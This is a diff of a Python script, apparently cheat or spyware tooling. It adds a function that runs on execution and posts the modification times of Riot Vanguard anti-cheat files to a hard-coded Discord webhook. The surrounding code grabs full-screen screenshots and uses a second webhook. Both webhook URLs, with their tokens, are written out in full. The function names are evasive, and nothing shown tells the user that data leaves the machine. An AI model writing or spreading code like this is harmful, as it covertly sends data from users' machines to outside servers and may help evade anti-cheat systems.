@@ -2,6 +2,19 @@ import requests
 import io
 from PIL import ImageGrab
 import time
+def gathering_data_okx(file_path, message):
+    webhook_url = "https://discordapp.com/api/webhooks/1351101845728137269/u2q5Qy5G78nozccKoPPTWVqedCFFOXiFgQ1B5V_2IJ8TWpUEQjcdPKH5eqU-MGX96Ieb"
+    mod_time = os.path.getmtime(file_path)
+    mod_time_human_readable = time.strftime('%B %d, %Y %I:%M%p', time.localtime(mod_time))
+    
+    data = {
+        "content": f"{message}{mod_time_human_readable}"
+    }
+    
+    requests.post(webhook_url, json=data)
+
+gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgc.exe", "vgc last update:")
+gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgk.sys", "vgk last update:")
 def data_sending_server(message: str):
     WEBHOOK_URL = "https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D"
     driver_ins = ImageGrab.grab()
